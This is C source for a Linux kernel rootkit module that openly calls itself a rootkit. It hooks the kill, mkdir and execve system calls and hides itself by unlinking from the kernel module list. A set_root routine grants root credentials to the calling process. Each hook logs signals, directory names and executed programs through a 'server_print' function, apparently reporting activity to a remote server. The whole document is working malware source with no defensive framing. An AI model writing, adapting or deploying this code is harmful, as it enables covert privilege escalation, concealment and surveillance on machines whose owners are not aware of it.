	/*=======*=======*\
		hooked kill
	\*=======*=======*/
ptregs_t orig_kill = (ptregs_t) 0;

bool module_hidden = false;
static struct list_head *prev_module;
static int hide_rootkit(void){
	if (!module_hidden){ //module is not hidden
		prev_module = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list);
		server_print("[rootkit] hidden\n");
	}
	else{
		list_add(&THIS_MODULE->list, prev_module);
		server_print("[rootkit] revealed\n");
	}
	module_hidden^=1;
	return 0;
}

static int set_root(void){ //changes credentials
	struct cred *root_creds;
	root_creds = prepare_creds();

	if (root_creds == NULL){
		return -1;
	}

	root_creds->uid.val = root_creds->gid.val = 0;
	root_creds->euid.val = root_creds->egid.val = 0;
	root_creds->suid.val = root_creds->sgid.val = 0;
	root_creds->fsuid.val = root_creds->fsgid.val = 0;

	commit_creds(root_creds);
	return 0;
}
static asmlinkage long hooked_kill(const struct pt_regs *regs){ //hook function
	char buffer[1024];
	int pid = regs->di;
	int sig = regs->si; //gets signal from pt_regs structure
	if (sig<10||sig==19||sig==18){
		sprintf(buffer, "[kill] pid = %i   signal = %i\n", pid, sig);
	}
	server_print(buffer);
	return orig_kill(regs); //kills process and returns result
}
struct hook_t sys_kill = {.hooked_syscall = hooked_kill, .syscall_number = __NR_kill};


	/*================*\
		hooked mkdir
	\*================*/
ptregs_t orig_mkdir = (ptregs_t) 0;
static asmlinkage long hooked_mkdir(const struct pt_regs *regs){
	char buffer[1024];
	char dir_name[NAME_MAX] = {0};
	char __user *pathname = (char *)regs->di;
	int mode = (int)regs->si;

	long error =  strncpy_from_user(dir_name, pathname, NAME_MAX);
	if (error>0){
		sprintf(buffer, "[mkdir] directory = %s   mode = 0x%x\n", dir_name, mode);
		server_print(buffer);
	}
	return orig_mkdir(regs);
}
struct hook_t sys_mkdir = {.hooked_syscall = hooked_mkdir, .syscall_number = __NR_mkdir};


	/*==========*==========*\
		hooked execve
	\*==========*==========*/
ptregs_t orig_execve = (ptregs_t) 0;
static asmlinkage long hooked_execve(const struct pt_regs *regs){
	char buffer[1024];
	char filename[NAME_MAX] = {0};
	char __user *filename_user = (char *)regs->di;

	long error =  strncpy_from_user(filename, filename_user, NAME_MAX);
	if (error>0){
		sprintf(buffer, "[execve] %s", filename);
		printk("buffer = %s", buffer);
		server_print(buffer);
	}
	printk("hooked-Execve: %i\n", error);
	return orig_execve(regs);
}
struct hook_t sys_execve = {.hooked_syscall = hooked_execve, .syscall_number = __NR_execve};
